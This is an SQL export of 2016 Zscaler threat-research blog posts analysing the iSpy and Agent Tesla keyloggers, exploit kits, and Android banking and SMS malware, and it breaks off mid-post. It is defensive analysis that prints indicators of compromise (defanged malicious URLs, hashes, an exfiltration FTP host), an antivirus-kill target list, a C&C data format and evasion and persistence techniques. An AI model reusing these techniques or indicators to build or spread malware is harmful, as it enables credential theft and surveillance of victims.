INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (90, 'iSpy Keylogger', 'Atinderpal Singh', 'September 16, 2016', 'Keyloggers have always been present in attackers’ toolkits. They give attackers the power to record every keystroke from a victim’s machine and steal sensitive information. Zscaler ThreatLabZ recently came across a signed keylogger campaign in our cloud sandbox. In this blog, we will provide an analysis of this malicious commercial keylogger, known as iSpy. Written in .Net 2.0, iSpy is configured for keylogging, stealing passwords and screenshots, and monitoring webcams and clipboards. It is being sold on underground forums via multiple subscription packages as shown in Figure 1.\r\n\r\n\r\n\r\nFigure 1: iSpy keylogger subscription packages\r\n\r\niSpy keylogger infection\r\niSpy is delivered via spam email that has malicious JavaScript or Document as an attachment, which then downloads the keylogger payload. The main iSpy payload is usually compressed using a custom packer. So far, we have seen packers written in Visual Basic 6.0, AutoIt, and .Net. We have also seen a campaign of signed .NET crypter where iSpy was served. This crypter uses different digital certificates (mostly invalid certificates) and drops different malware samples, as shown in Table 1 below\r\n\r\n\r\n\r\nFigure 2: Certificate used by .Net Crypter\r\n\r\n \r\n\r\n\r\n	Table 1: Different malware samples dropped by .NET crypter\r\n	\r\n		\r\n			MD5\r\n			Email used in certificate\r\n			Malware\r\n		\r\n		\r\n			b99491b53faabb559adf42d6156d9dad\r\n			web@vazi.com\r\n			iSpy\r\n		\r\n		\r\n			2b8e2d23c88b11bbcf59928d5d440bdb\r\n			sales@maltech.net\r\n			Phorpiex\r\n		\r\n		\r\n			73dcbece89a474bccfb76f022e5e81a4\r\n			sales@maltech.net\r\n			Skypoot\r\n		\r\n		\r\n			c1838d9542e6860cd44d706883b49a73\r\n			sales@maltech.net\r\n			Skypoot\r\n		\r\n		\r\n			2aac4e7b7a1ab407039e12b53a4af942\r\n			sales@maltech.net\r\n			Phorpiex\r\n		\r\n		\r\n			398680cbdd017f7b99e9add1477939a8\r\n			owner@reca.net\r\n			Phorpiex\r\n		\r\n		\r\n			2368102c5e12b0c881bc09256546d255\r\n			owner@reca.net\r\n			Skypoot\r\n		\r\n		\r\n			92a342a6ce4b0accfb20c61fd657104b\r\n			sales@maltech.net\r\n			Phorpiex\r\n		\r\n		\r\n			1ffadc9cde4d4a1d794362c9179a0ec9\r\n			sales@maltech.net\r\n			Phorpiex\r\n		\r\n		\r\n			c17cddb6f63d9797583167a30c5711c1\r\n			sales@maltech.net\r\n			Phorpiex\r\n		\r\n		\r\n			de7db381733f3c5a479865120f58a8c1\r\n			sales@maltech.net\r\n			Phorpiex\r\n		\r\n		\r\n			58334fb57165350ccb06c1949459a65c\r\n			sales@maltech.net\r\n			Skypoot\r\n		\r\n		\r\n			5e6114b726b1b8a52331890054157969\r\n			sales@maltech.net\r\n			Skypoot\r\n		\r\n		\r\n			12f4de75e2e299e6d444a58fff78d83d\r\n			sales@maltech.net\r\n			Phorpiex\r\n		\r\n		\r\n			92eaac8b2266fb2514e66a8e2cf98f13\r\n			sales@salung.com\r\n			Kasidet\r\n		\r\n		\r\n			a9867d69c3d7d716339dd10ac4b29216\r\n			sales@salung.com\r\n			Phorpiex\r\n		\r\n		\r\n			edaf8ce53d4919c52e422c7ce7242738\r\n			sales@salung.com\r\n			Phorpiex\r\n		\r\n		\r\n			2b478db2af56153a2cee33f71213cc2f\r\n			sales@salung.com\r\n			Hawkeye\r\n		\r\n		\r\n			214280b4e09fe4c4cc46aebef533e07e\r\n			support@yapilo.com\r\n			Phorpiex\r\n		\r\n		\r\n			ba8c47e679eba575c4e8605da97f4e77\r\n			support@yapilo.com\r\n			Phorpiex\r\n		\r\n		\r\n			d151378aeae384e85ab10f5bb19ef254\r\n			support@yapilo.com\r\n			Phorpiex\r\n		\r\n		\r\n			881e968ddf34c38943a56651a3870174\r\n			email@vario.co\r\n			Subti\r\n		\r\n		\r\n			0e565eb881a25180993539f34e88ec3d\r\n			sales@maltech.net\r\n			Bladabindi\r\n		\r\n	\r\n\r\n\r\n \r\n\r\nInstallation\r\nThe malware sample we analyzed was packed with a VB6 (native) custom packer. The packer uses the XOR-based method to decrypt the payload and contains obfuscated zombie code between instructions to slow down analysis. Figure 3 shows the installation and functionality overview of iSpy.\r\n\r\n\r\n\r\nFigure 3: Installation workflow and functionality overview of iSpy\r\n\r\nThe second layer of packing contains multiple anti-VM and anti-analysis tricks, some of which include:\r\n\r\n\r\n	Checks PEB flags for debugger presence\r\n	Checks for sandbox and debugger using GetTickCount and Sleep\r\n	Loops until cursor movement is detected\r\n	Checks if screen resolution is 800 x 600 or more\r\n\r\n\r\nFinally, it decrypts the payload file and injects the decrypted file into another instance of the same process using process hollowing technique as seen below:\r\n\r\n\r\n\r\nFigure 4: Spawns process in Suspended mode for injection\r\n\r\nThe decrypted file is a loader file that contains a DLL and .NET binary in its resource section. It first loads the DLL file that further loads the final iSpy payload (.NET binary) using LoadDotNetPE export function.\r\n\r\nThe malware checks configuration settings to select the folder for dropping the executable. Based on the configuration, it drops itself into one of the following locations:\r\n\r\n\r\n	%APPDATA%\r\n	%LOCALAPPDATA%\r\n	%USERPROFILE%\\Documents\r\n	%TEMP%\r\n\r\n\r\n\r\n\r\nFigure 5: Installation function\r\n\r\nAfter copying itself into any of the above mentioned locations, it deletes “Zone.Identifier” flag from Alternate Data Stream (ADS) to disable the security warning message that is displayed every time the malware file is executed.\r\n\r\nPersistence\r\nIt creates an entry in “SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run” key under HKLM or HKCU, based on configuration settings, to execute the malware on system startup.\r\n\r\nConfiguration\r\niSpy has many customizable features (Figure 6) including the functionality to record keystrokes, recover passwords, and retrieve serial keys from various software, then sending the stolen data over SMTP, HTTP, or FTP. It also has a web panel that helps the attacker to monitor the activity of iSpy infections.\r\n\r\n\r\n\r\nFigure 6: iSpy configuration class\r\n\r\nAs mentioned earlier, depending on the configuration, it can send stolen data via three different methods: HTTP, SMTP, or FTP. FTP and SMTP credentials, directly encoded in the file, are encrypted using a custom encryption method. Function decrypt, in the class StringCipher, is used for the decryption of credentials as well as other strings. MUTEX value from the configuration is used as the key for decryption. For the HTTP method, iSpy uses the PHP_KEY authentication to upload data to C&C server.\r\n\r\nData stealing\r\nThe current sample, discussed in this blog, uses FTP for sending the stolen data to attacker. The FTP account – ftp://ftp[.]bhika[.]comxa[.]com –was active at the time of analysis and the ftp credentials are embedded in the file itself. The website resolves to IP address “31.170.160.209” which belongs to comxa.com, which is owned by 000webhost Network, a provider of free hosting. We have notified comxa.com of the offending account.\r\n\r\nAfter successful installation, iSpy collects computer information such as username, Windows version, and installed program details (AV, firewall, browser, etc.), and sends this information along with install notification (Figure 7) to a C&C server.\r\n\r\n\r\n\r\nFigure 7: Installation notification contents\r\n\r\nKeylogging code is the main component of this malware. It logs timestamped key presses and sends them to the attacker. It also contains code to steal the license keys of application software, such as Adobe Photoshop, Microsoft Office, and others. It also collects saved passwords from web browsers, email clients (such as Outlook), FTP clients (like FileZilla and CoreFTP), and games like Minecraft.\r\n\r\nKillAV\r\niSpy has the functionality to disable antivirus programs by creating a sub-key of the program name under registry key, “Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\” and then setting “rundll32.exe” as the value of “Debugger” under that key. It also disables access to that newly created registry key by setting all RegistryRights to deny so it cannot be easily removed. After this change in registry, Windows will load “rundll32.exe” when the targeted process is started. As a result, the given AV process will not start. Below is the list of AV processes that iSpy targets:\r\n\"rstrui.exe\", \"AvastSvc.exe\", \"avconfig.exe\", \"AvastUI.exe\", \"avscan.exe\", \"instup.exe\", \"mbam.exe\", \"mbamgui.exe\", \"mbampt.exe\", \"mbamscheduler.exe\", \"mbamservice.exe\", \"hijackthis.exe\", \"spybotsd.exe\", \"ccuac.exe\", \"avcenter.exe\", \"avguard.exe\", \"avgnt.exe\", \"avgui.exe\", \"avgcsrvx.exe\", \"avgidsagent.exe\", \"avgrsx.exe\", \"avgwdsvc.exe\", \"egui.exe\", \"zlclient.exe\", \"bdagent.exe\", \"keyscrambler.exe\", \"avp.exe\", \"wireshark.exe\", \"ComboFix.exe\", \"MSASCui.exe\", \"MpCmdRun.exe\", \"msseces.exe\", \"MsMpEng.exe\"\r\n\r\nWebCam Snapshot & Screen grabber\r\nIf the webcam logger is configured, it will capture snapshots using the victim’s webcam. It saves the snapshot in %TEMP% folder with the prefix “snapshot” with the .PNG extension. It can then uploads the snapshot to “http://uploads.im/api?upload” (a legitimate image hosting website). It logs the URL path of uploaded snapshot and uploads the log’s data on a C&C server using the configured method.\r\n\r\nSimilarly, iSpy takes screen shots using .NET API CopyFromScreen and saves them to a file with the name “img.png” under the %TEMP% folder. Saved images are uploaded to the website mentioned above and a log of URL paths of uploaded files is sent to attacker.\r\n\r\nOther features of iSpy:\r\n\r\n\r\n	Website blocking (based on host file modification)\r\n	File downloading\r\n	Bot killer\r\n	Fake message (it displays this message every time malware starts execution)\r\n	Disabler (Taskmgr, Regedit, CMD)\r\n	Runescape PinLogger(RuneScape is a fantasy MMORPG developed and published by Jagex, A Bank PIN is a security feature provided in game that players can use to protect their, virtual in game, banks.)\r\n	Run Bind file (file to run along with malware)\r\n\r\n\r\nWeb panel interface\r\nThe current version of iSpy has a web panel where the attacker can monitor the infected system.\r\n\r\n\r\n\r\nFigure 8: iSpy web panel\r\n\r\nConclusion\r\nCommercial keyloggers are general-purpose data stealing tools used by criminals to collect as much data as possible about a victim. There are many commercially available keyloggers in the underground market and, unfortunately, using them is fairly easy, requiring little technical knowledge. In spite of the increased use of specialized tools, the keylogger remains a common, and quite potentially damaging, tool. Zscaler ThreatLabZ will continue to monitor keyloggers and provide coverage for customers who may be targeted.\r\n\r\nIndicators of compromise:\r\nURL serving iSpy sample- gratja[.]top/gff/trf.exe\r\nMD5 - ca66771aaaf3e6b4be57f09d9cfabcc1\r\n\r\n \r\n\r\n\r\n	Table 2: Other iSpy Samples seen in the wild\r\n	\r\n		\r\n			MD5\r\n			Packer\r\n			Upload Method\r\n		\r\n		\r\n			3f0b2fead12d62bcd7d8ca3b2673ed7f\r\n			VB6(Native)\r\n			SMTP\r\n		\r\n		\r\n			7a9af64a04cf9577bfc76865ae190349\r\n			.NET Crypter\r\n			FTP\r\n		\r\n		\r\n			08abb6dc71fe3076f9f149c849de737a\r\n			AutoIT\r\n			FTP\r\n		\r\n		\r\n			9373eb008dd45458d424ce928b8d4475\r\n			.NET Crypter\r\n			HTTP\r\n		\r\n		\r\n			51981d91472c00a78a6358cc2d5ff47f\r\n			.NET Crypter\r\n			HTTP\r\n		\r\n		\r\n			931512db9f969726a051737ce8579497\r\n			VB6(Native)\r\n			FTP\r\n		\r\n		\r\n			153185846e8fb4edb9e9ec9c3ea73e75\r\n			AutoIT\r\n			SMTP\r\n		\r\n		\r\n			c17dad76326700c24daef882e8550be4\r\n			AutoIT\r\n			FTP\r\n		\r\n		\r\n			ca66771aaaf3e6b4be57f09d9cfabcc1\r\n			VB6(Native)\r\n			FTP\r\n		\r\n		\r\n			cb077968a96f497a994010b55771be2e\r\n			AutoIT\r\n			FTP\r\n		\r\n		\r\n			b99491b53faabb559adf42d6156d9dad\r\n			.NET Crypter\r\n			SMTP\r\n		\r\n		\r\n			c8dabc7680e8b7ed344994eb39599296\r\n			VB6(P-Code)\r\n			FTP\r\n		\r\n	\r\n\r\n\r\n \r\n\r\nBlog by: Atinderpal Singh, Nirmal Singh', 'Malware', 'https://www.zscaler.com/blogs/research/ispy-keylogger');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (91, 'A quick look at recent malvertising exploit chains', 'Ed Miles', 'September 07, 2016', 'Introduction    Zscaler ThreatLabZ, during our daily exploit kit (EK) tracking, have been seeing some changes in both RIG and Sundown EKs. We recently encountered a malvertising chain serving both EKs on subsequent visits, and decided to compile a quick look at the these cases.             Figure 1 - Graph showing the malvertising chains         Sundown      Sundown Exploit Kit, as we have covered before, is relatively new to the EK scene. The developers aren\'t wasting much time however, and have been seen to make rapid changes to the kit, marking a general trend towards increasing complexity. We have seen this in all aspects of the kit, including their gate/redirector usage, leveraging of malvertising, landing page features and formats, and hosting infrastructure used.    Previously, we were seeing Sundown traffic mostly coming from infected websites, using very simple gates to redirect to the landing page. The domain \"tdconsultantspecialists.com\" was the main Sundown redirector we observed, until they moved to \"corporatecompanybus.com\".             Figure 2 - Sundown cycle from corporatecompanybus.com featuring domain shadowing         Following (or perhaps in conjunction with) the gate change, Sundown has moved further into malvertising, which now makes up the majority of our observed Sundown traffic. Sundown has also made some changes to their hosting infrastructure choices, and is looking like a more \"professional\" cybercrime operation recently, with what appear to be shadowed domains (registered at GoDaddy) utilized for landing page hosts. Subdomains are created on the shadowed accounts, yielding URL patterns that can make Sundown traffic look very much like RIG.             Figure 3 - Excerpt of recent Sundown landing page URLs         We\'ve also begun seeing an interesting divergence in the hosting of landing page and payloads. In a recent case, the landing pages and payloads were served from different IPs and hostnames, however the case we present today features the same IP but different hostnames on different shadowed domains.             Figure 4 - Sundown EK cycle showing usage of different hostnames for payload delivery         While the hosting structure of Sundown has seen an improvement, the rapid development has been most evident in the landing page code. In July, we noticed Sundown deployed the latest IE exploit, CVE-2016-0189, as the sole payload of the landing page.              Figure 5 - Sundown EK briefly used CVE-2016-0189 as the sole landing page element         This was not to last, as they quickly integrated the exploit into the more typical Sundown landing page format. In a more recent episode, Trustwave\'s Spiderlabs spotted the addition of a fingerprinting code, however we have not seen this feature in our captured cycles, so the operators may have opted for the simpler, non-fingerprinted landing page since then.             Figure 6 - Sundown\'s new obfuscation layer, part 1         We spotted another change on the Sundown landing page: an additional obfuscation layer implemented in the PHP backend code. We encountered this last week and were also able to get a sneak peek at the backend code, which showed the implementation of a dynamic obfuscation layer. This layer uses a randomized 4-byte key in a simple XOR routine, with randomized variable names added to hinder analysis. The feature is quite simple, though, and perhaps for this reason, the authors ultimately removed the feature just as quick as they added it. Perhaps this is part of some kind of A/B feature-testing regime.        Figure 7 - Sundown\'s new obfuscation layer, part 2             RIG         In the wake of both Angler and Nuclear disappearing, RIG has taken a dominant position in the EK landscape. The RIG operators appear content, however, to iterate more slowly, with changes to the EK itself happening less frequently. That said, RIG EK authors have now made noticable changes to the landing page structure.        Figure 8 - RIG EK landing page with a brand new look         Where the RIG landing page was previously only lightly obfuscated, relying primarily on base64-encoded data, the new landing page is somewhat reminiscent of a previous Angler format, with an extended-ascii twist. Despite looking highly obfuscated at first glance, the landing page is easily decoded in two stages.        Figure 9 - The right pane features the fully decoded landing page             Besides RIG\'s inclusion into the EITest and (pseudo) Darkleech campaigns, we would also like to point out the changing hostname patterns being used. Some cases have used hostnames that might suggest a closer partnership with EITest (using 2 level hostnames in the .top TLD, similar to typical EITest-Neutrino cycles), but the historic pattern of [two-letter subdomain].[domain-shadowed-account].[tld] has been tossed aside. RIG has also been branching out into new hosting provider networks, with Host Sailor, OVH SAS, and OOO NPO Relcom joining Webzilla B.V. and OOO IT-Grad.         Conclusion    At this point, it\'s clear that the exploit kit landscape has been thoroughly shaken up since the disappearance of Angler and Nuclear (as we have covered in our round-ups and other EK-related blogs). This small update is meant to give a quick look at the latest techniques and trends used by RIG and Sundown. We will continue to monitor the situation, and provide updates to the community as usual.', 'Exploit Kit', 'https://www.zscaler.com/blogs/research/quick-look-recent-malvertising-exploit-chains');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (92, 'Top Exploit Kit Activity Roundup - Summer 2016', 'Derek Gooley', 'September 02, 2016', 'Overview    This is the second in a series of blogs collecting the recent activity of the current top exploit kits. Exploit kits are rapidly deployable software packages designed to leverage vulnerabilities in web browsers to deliver a malicious payload to a victim’s computer. Authors of exploit kits offer their services for sale, distributing malware for other malicious actors.    Find our previous roundup here.    Neutrino Exploit Kit    In our previous roundup, we noted that the EITest campaign had begun redirecting primarily to Neutrino landing pages since Angler exploit kit activity abruptly stopped in early June 2016. EITest gates have continued redirecting to Neutrino landing pages, as well as RIG, throughout Summer 2016.        Figure 1: Neutrino hits, July - August 2016        Figure 2: Neutrino heatmap>    Neutrino landing pages still primarily use top TLD names and target Adobe Flash Player. The majority of Neutrino hosts observed were hosted in Western Europe and North America.    Starting in mid-June, the EITest Neutrino landing pages began distributing CryptXXX ransomware payloads. Prior to its shutdown, Angler was the main distributor of CryptXXX ransomware, and its stoppage caused a significant decline in CryptXXX infections. The increased usage of Neutrino to distribute CryptXXX helped fill the void left by Angler.        Figure 3: EITest gate redirect to Neutrino landing page>    In late July, EITest Neutrino landing pages began delivering CrypMIC ransomware, a new variant of CryptXXX. Non-EITest Neutrino campaigns involving malvertising continue to drop Tofsee, Gamarue, and various ransomware payloads.        Figure 4: CrypMIC payload from Neutrino infection chain    CrypMIC ransomware communicates with its C&C server via plain text over TCP port 443 (typically reserved for HTTPS/SSL traffic).        Figure 5: CrypMIC callback and ransom page        Figure 6: Example CrypMIC ransom instructions    RIG Exploit Kit    RIG remains active over several campaigns. The usual compromised sites and malvertising redirects are prevalent, as well as redirections to RIG from EITest gates.        Figure 7: RIG hits    Observed hits on RIG domains have been relatively consistent throughout the summer.        Figure 8: RIG heat map    The United States is still the largest host of RIG domains, though this summer we have seen an increase of hosts in Russia, as well as in several countries in Western Europe and the Americas.    The “topgunnphoto” gate mentioned in our previous roundup is still visible, but infection cycles from this gate declined through late July and early August. A thorough overview of recent RIG activity was published by Malwarebytes in late July, which illustrates several common RIG campaigns.    Not covered in the Malwarebytes article is a non-standard RIG campaign that originates with casino-themed malvertising. This campaign uses an atypical landing page URL scheme mentioned in the previous roundup, which breaks from the pattern of a two-character third-level domain.        Figure 9: RIG casino-based malvertising infection cycle    RIG continues to drop Tofsee payloads and a new variant of Zeus, as we have previously described. Recently, RIG has started dropping the Gootkit banking trojan through the EITest campaign, as well as Vawtrak and Cerber payloads.    Other Exploit Kits    Magnitude Exploit Kit    Magnitude is a long-running exploit kit that has been active since October 2013. Through summer, it has continued its recent trend of dropping Cerber ransomware payloads through malvertising campaigns.        Figure 10: Magnitude infection cycle    Angler Exploit Kit    Angler EK shut down in early June 2016, and is now considered to be defunct. EITest gates which had been primarily redirecting to Angler landing pages have since begun redirecting to Neutrino and RIG landing pages.    Nuclear Exploit Kit    Nuclear has had no activity since late April 2016, and is now considered to be defunct. Some compromised site injection artifacts are still observed, but no active redirectors or gates.    Sundown Exploit Kit    In early July, Zscaler’s ThreatLabZ published an article analyzing the activity of Sundown over the previous month. Most recently, variations to Sundown’s landing page obfuscation structure have been observed, and Sundown has begun dropping a variant of the Kasidet backdoor with modified callback protocols.        Figure 11: Sundown landing page excerpt    In early July, Sundown EK quickly integrated the recently-published exploit CVE-2016-0189, a VBScript memory corruption vulnerability in IE11, into new landing pages. The standard Sundown landing page was replaced entirely with a modified version of the open source POC for the exploit.        Figure 12: Sundown EK using CVE-2016-0189    Conclusion    Exploit kits pose a significant threat to users during simple web browsing. In the case of ransomware infections, the result could be the inability of a user to access his or her files. The techniques exploit kit authors use to hide their activities are frequently changing, and security researchers work hard to analyze and block these new threats.    To help avoid infections such as these, users should always block untrusted third-party scripts and resources, and avoid clicking on suspicious advertisements. Zscaler’s ThreatLabZ has confirmed coverage for these top exploit kits and subsequent payloads, ensuring protection for organizations using Zscaler’s Internet security platform.', 'Exploit Kit', 'https://www.zscaler.com/blogs/research/top-exploit-kit-activity-roundup-summer-2016');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (93, 'Agent Tesla Keylogger delivered using cybersquatting', 'Deepen Desai', 'August 25, 2016', 'Introduction\r\n\r\nZscaler ThreatLabZ recently came across an attack chain in which cybersquatting was being used to deliver a commercial keylogger, called “AgentTesla,” with an intent to steal confidential information. The keylogger payload was configured to relay the stolen information back to the cyber-squatted domain, which had been registered two months prior to the attack.\r\n\r\nThe malicious domain in this case was “diodetechs[.]com” trying to imitate diodetech[.]com, which belongs to a legitimate consulting firm that offers a variety of services to global enterprises. We notified Diode technologies about the attack earlier this month and the offending domain has been suspended.\r\n\r\nAgentTesla keylogger\r\n\r\nAgentTesla is an advanced keylogger with features like clipboard logging, screen keylogging, screen capturing, and extracting stored passwords from different web browsers. It is written in .NET and supports all versions of the Windows operating system. In this blog, we will analyze the AgentTesla payload that was used in the attacks involving cyber-squatted domain ‘diodetechs[.]com’. \r\n\r\n\r\n\r\nFigure 1: Subscription packages of AgentTesla keylogger\r\n\r\nThe Infection cycle\r\n\r\nThe infection cycle typically starts with a malicious office document that arrives as an e-mail attachment. The document uses the social engineering tactics covered here to lure the user into running the embedded macro, which will download and install the malware executable. The malware executable is the AgentTesla keylogger that was hosted at the following location:\r\n\r\n\r\n	diodetechs[.]com/bless/cc.exe [cyber-squatted domain]\r\n	MD5 - e4117e6974363cac8b37e5e3ff5d07a6\r\n\r\n\r\n \r\n\r\n\r\n\r\nFigure 2: AgentTesla configuration panel\r\n\r\nInstallation\r\n\r\nThe AgentTesla payload gets downloaded and executed from location “%temp%\\cc.exe”. It makes a copy of itself as “JavaUpdtr.exe” in the “%Application Data%\\Java\\” directory, pretending to be a Java updater. It also creates the following registry entry to remain persistent upon system reboot:\r\n\r\n\r\n	HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run @ Java Updtr\r\n\r\n\r\nThe installer then starts a new process ‘MSBuild.exe’ in suspended mode, injects itself into this new process before resuming execution. This is where the keylogging, screen capturing, and other information collection modules are started. The author leveraged legitimate password recovery tools like IEPasswordDump and MailPassView to steal user credentials from Internet Explorer & Microsoft Outlook. \r\n\r\n\r\n\r\nFigure 3: Embedded IEPasswordDump utility\r\n\r\nThe logged keystroke information is saved at “%temp%\\log.tmp” in plain-text and the screenshots are saved in the folder “%appdata%\\ScreenShot\\.” The information collected from the victim’s machine is relayed to the remote C&C server every 20 minutes. \r\n\r\nBot configuration\r\nThe configuration file contains a full list of modules that were configured by the attacker. This version has multiple modules, including keylogging, screenshot capturing, password stealing, etc., enabled as shown below:\r\n\r\n\r\n\r\n\r\nFigure 4: AgentTesla bot configuration\r\n\r\nModule information\r\nWhat follows is a brief overview of the modules that are supported by this payload.\r\n\r\nUSB Spreader – Capable of spreading through USB drives\r\nMelt – Capable of uninstalling itself from the victim’s machine\r\nWebcam – Capable of taking screenshots through the victim machine’s webcam\r\nScreenShot – Capable of taking screenshots capturing user activity\r\nKeylogger –  Capable of logging keystrokes from traditional as well as virtual keyboard; it can also log data from the clipboard\r\nPassword stealing – Capable of stealing stored password from various applications, like Chrome, Opera, Yandex, Firefox, IE, SeaMonkey, Comodo, Chromium, dyndns, Filezilla, FlashFXP, Outlook, Netscape, and others\r\nAnti-Analysis – Capable of terminating multiple antivirus, security, and analysis programs running on the victim machine; it is also capable of detecting popular sandboxes and virtual environments \r\n\r\nAdditionally, AgentTesla is capable of disabling UAC, Taskmgr, CMD, Run, Control Panel, Regedit, SystemRestore, etc., on a victim’s machine.\r\n\r\n\r\n\r\nFigure 5: AgentTesla disabling system features\r\n\r\nNetwork activity\r\n\r\nThe payloads that we analyzed were all connecting to agenttesla[.]com upon successful installation to check for keylogger software update as seen below: \r\n\r\n\r\n\r\nFigure 6: AgentTesla C&C activity\r\n\r\nThe malware then starts sending collected information and screenshots to the remote server.\r\n\r\nFormat of data it sends\r\n\r\n\r\n	type={0}&hwid={1}&time={2}&pcname={3}&logdata={4}&screen={5}&ipadd={6}&wbscreen={7}&client={8}&link={9}&username={10}&password={11}&screen_name={12}&site_username={13}\r\n\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n			Command\r\n			\r\n			\r\n			Description\r\n			\r\n		\r\n		\r\n			\r\n			webcam\r\n			\r\n			\r\n			Send images collected via webcam to C&C server\r\n			\r\n		\r\n		\r\n			\r\n			screenshots\r\n			\r\n			\r\n			Send screenshots to C&C\r\n			\r\n		\r\n		\r\n			\r\n			keylog\r\n			\r\n			\r\n			Send keystroke logs to C&C\r\n			\r\n		\r\n		\r\n			\r\n			update\r\n			\r\n			\r\n			Update keylogger binary\r\n			\r\n		\r\n		\r\n			\r\n			info\r\n			\r\n			\r\n			Send victim’s machine information to C&C\r\n			\r\n		\r\n		\r\n			\r\n			uninstall\r\n			\r\n			\r\n			Uninstall binary\r\n			\r\n		\r\n		\r\n			\r\n			passwords\r\n			\r\n			\r\n			Send stolen password to C&C\r\n			\r\n		\r\n	\r\n\r\n\r\n \r\n\r\nConclusion\r\n\r\nOur investigation of this attack chain started with the keylogger payload getting flagged in the cloud sandbox for an enterprise customer. Further analysis revealed usage of cybersquatting for delivering the malware executable. The malicious domain was registered on the same day that the malicious documents, which were claiming to be “Purchase Orders,” were modified for the attack.\r\n\r\nZscaler ThreatLabZ will continue to monitor and ensure coverage against these malware payloads.\r\n\r\nBlog by: Abhaykant Yadav, Deepen Desai', 'Compromise;Malware', 'https://www.zscaler.com/blogs/research/agent-tesla-keylogger-delivered-using-cybersquatting');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (94, 'Android Marcher: Continuously Evolving Mobile Malware', 'Viral Gandhi', 'August 10, 2016', 'Founded in 2013, the Android Marcher mobile malware has widely been targeting Google Play -- harvesting user credentials and credit card data. The malware waits for victims to open the Google Play store and then displays a fake html overlay page asking for credit card information. The fake page will not go away until the user provides the payment information.\r\n\r\nIn March 2014, we noticed newer variants targeting financial organizations in Germany. Upon infection, Marcher would inspect the victim’s device and send a list of all installed apps to its command and control (C&C) server. If the malware found any German financial apps installed in the device, it would show a fake page asking for credentials of that particular institution. Unaware that the login page is a fake, the victim would provide their credentials where they would then be sent to the malware’s C&C. The malware would also show a fake Google Play payment page if the infected device did not have any German financial firm apps. We covered one such sample in a previous blog, see here .\r\n\r\nMarcher then started targeting financial firms in Australia, France, Turkey and The United States. Some Marcher samples were observed targeting PayPal as well.\r\n\r\nRecently, Marcher added United Kingdom to its hit list, as seen by TrendMicro.\r\n\r\n\r\nPreviously, Marcher was distributed through fake Amazon and Google Play store apps. We’ve also seen it delivered through a fake porn site that posed as a Chrome update. This month, we observed another new change in the Marcher malware campaign where it is being delivered as a fake Android firmware update. We discovered the payload dropped as “Firmware_Update.apk”. An HTML page serving this malware scares the victim by showing that the device is vulnerable to viruses and to prevent personal data theft, prompting them to install the fake update.\r\n\r\n                                                       \r\n\r\n                                                         Fake update page\r\n\r\nTo perform its malicious activity upon installation, Marcher will ask for administrative access.\r\n\r\nIn 2013, Marcher was only targeting Russian mobile users; however, in the recent samples the author implemented checks to find out if the infected device is from CIS/SIG. It will stop its activity if the device belongs to CIS/SIG territory. Generally, the malware author does this check to avoid any legal cases from its own territory. Such checks indicate that the malware may have been authored and maintained from CIS/SIG countries. See the following screenshot.\r\n\r\n                                                           \r\n\r\n                                                           CIS/SIG countries check\r\n\r\nAnother change in this newer variants is implementation of simple obfuscation by the malware author using base64 encoding and string replace functions. In older samples, we did not see this obfuscation. See the following screenshot.\r\n\r\n                                                           \r\n\r\n                                                           Simple obfuscation techniques\r\n\r\nIn older Marcher samples we saw that the malware will only show fake a Google Play store credential page if the user opens the Play store app. In recent samples, the malware author implemented checks for multiple well-known apps and shows fake credential page if user opens any of these apps. Following are the apps listed in the code and shown in above screen encoded in base64.\r\n\r\n\r\n	Playstore (com.android.vending)    \r\n	Viber app (com.viber.voip)\r\n	Whatsapp (com.whatsapp)    \r\n	Skype     (com.skype.raider)\r\n	Facebook messenger (com.facebook.orca)\r\n	Facebook (com.facebook.katana)\r\n	Instagram (com.instagram.android)\r\n	Chrome (com.android.chrome)\r\n	Twitter (com.twitter.android)    \r\n	Gmail (com.google.android.gm)    \r\n	UC Browser (com.UCMobile.intl)\r\n	Line (jp.naver.line.android)\r\n\r\n\r\nWe have also seen changes related to C&C communication. In older samples the Marcher was communicating on simple http protocol. Now it does C&C communication over SSL. Observe following screen captures.\r\n\r\n                                                        \r\n\r\n                                                        C&C \r\n\r\n                                                       \r\n\r\n                                                       C&C over SSL\r\nWe are seeing numerous infection attempts in our cloud for this malware family. These frequent changes clearly indicate active malware development that is constantly evolving -- making it the most prevalent threat to the Android devices.\r\n\r\nTo avoid being  a victim of such malware, it is always best to download apps only from trusted app stores, such as Google Play. This can be enforced by unchecking the \"Unknown Sources\" option under the \"Security\" settings of your device.\r\n\r\nZscaler ThreatLabZ is actively monitoring this malware and ensuring that Zscaler customers are protected.', 'Mobile Malware', 'https://www.zscaler.com/blogs/research/android-marcher-continuously-evolving-mobile-malware');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (95, 'Pokémon GO : Pikachu thunder shocks user’s wallet and personal life.', 'Viral Gandhi', 'July 20, 2016', 'The recent release of Pokémon GO has led the game to become one of most popular apps for Android and iOS - having been downloaded by more than 5 million users. The game is currently available in multiple countries all over the globe; however, there are still a handful of countries eagerly waiting for its release. In turn, attackers are taking advantage of the hype and are scamming large numbers of mobile users.    Recently at ThreatlabZ we came across an Android SMS Trojan disguised as the Pokémon GO app in one of our threat feeds. This malware secretly sends SMS to premium numbers, which costs money to the victim.       Technical Analysis:    We have observed that this malware was dropped from the following URL.      	http[:]//taigamesvui[.]xyz/sms/pokemongo[.]apk       The malware installs itself with the legit Pokémon GO application icon so that the users are not suspicious as seen below:       Icon    Upon clicking the icon, malware shows the following page to victim.         Downloading APK    Once the user clicks on the first button, malware starts downloading another Pokémon Go game from the following URL.      	http[:]//waptuoitre[.]net/dulieu/pokemongo[.]apk      In addition to downloading the APK from the URL listed above, the malware secretly sends SMS to premium numbers. Observe the following code which depicts the malicious activity.        JavaScript code    Unlike common android malware, this malware performs malicious activity from a HTML page residing in the asset folder of the malware package. The “Android.send” function is defined in the DEX file. This function is trigged by the HTML page by passing necessary arguments once 